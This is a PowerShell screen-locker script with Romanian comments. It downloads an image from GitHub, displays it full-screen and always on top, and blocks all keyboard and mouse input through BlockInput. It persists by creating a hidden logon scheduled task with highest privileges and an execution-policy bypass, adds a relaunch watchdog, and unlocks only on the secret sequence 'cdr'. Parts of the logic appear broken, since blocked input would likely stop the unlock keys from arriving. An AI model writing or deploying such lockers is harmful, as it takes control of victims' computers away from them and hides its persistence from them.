# Configurare URL pentru imagine
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\cdr.png"

# Descărcare imagine
function Download-Image {
    try {
        Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
    } catch {
        Write-Host "Eroare la descărcarea imaginii. Verificați conexiunea la internet." -ForegroundColor Red
        exit
    }
}

# Afișare imagine pe tot ecranul
function Show-FullScreenImage {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $form = New-Object System.Windows.Forms.Form
    $form.WindowState = 'Maximized'
    $form.FormBorderStyle = 'None'
    $form.TopMost = $true
    $form.KeyPreview = $true

    try {
        $img = [System.Drawing.Image]::FromFile($tempImagePath)
    } catch {
        Write-Host "Eroare la încărcarea imaginii." -ForegroundColor Red
        exit
    }

    $pictureBox = New-Object System.Windows.Forms.PictureBox
    $pictureBox.Image = $img
    $pictureBox.Dock = 'Fill'
    $pictureBox.SizeMode = 'StretchImage'
    $form.Controls.Add($pictureBox)

    $global:keySequence = ""
    $form.KeyDown += {
        param($sender, $eventArgs)
        $global:keySequence += $eventArgs.KeyChar
        if ($global:keySequence -like "*cdr") {
            Stop-All
        }
    }

    $form.Add_Shown({ $form.Activate() })
    $form.ShowDialog()
}

# Blochează tastele critice
function Block-Keys {
    $filter = "[DllImport('user32.dll')] public static extern int BlockInput(bool fBlockIt);"
    Add-Type -MemberDefinition $filter -Namespace Win32 -Name NativeMethods
    [Win32.NativeMethods]::BlockInput($true)
}

# Deblochează tastele
function Unblock-Keys {
    $filter = "[DllImport('user32.dll')] public static extern int BlockInput(bool fBlockIt);"
    Add-Type -MemberDefinition $filter -Namespace Win32 -Name NativeMethods
    [Win32.NativeMethods]::BlockInput($false)
}

# Oprește complet scriptul și elimină sarcina din Task Scheduler
function Stop-All {
    Unblock-Keys
    schtasks /delete /tn "PersistentImageViewer" /f | Out-Null
    Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Stop-Process -Force
    exit
}

# Persistență prin Task Scheduler
function Set-Startup {
    $taskName = "PersistentImageViewer"
    $scriptPath = $MyInvocation.MyCommand.Path
    schtasks /create /tn $taskName /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File '$scriptPath'" /sc onlogon /rl highest /f | Out-Null
}

# Monitorizare proces pentru repornire automată
function Monitor-Process {
    while ($true) {
        if (-not (Get-Process -Id $pid -ErrorAction SilentlyContinue)) {
            Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$MyInvocation.MyCommand.Path`"" -WindowStyle Hidden
            exit
        }
        Start-Sleep -Seconds 1
    }
}

# Descărcare imagine și inițializare
Download-Image
Set-Startup
Start-Job -ScriptBlock { Monitor-Process }
Block-Keys
Show-FullScreenImage
Unblock-Keys
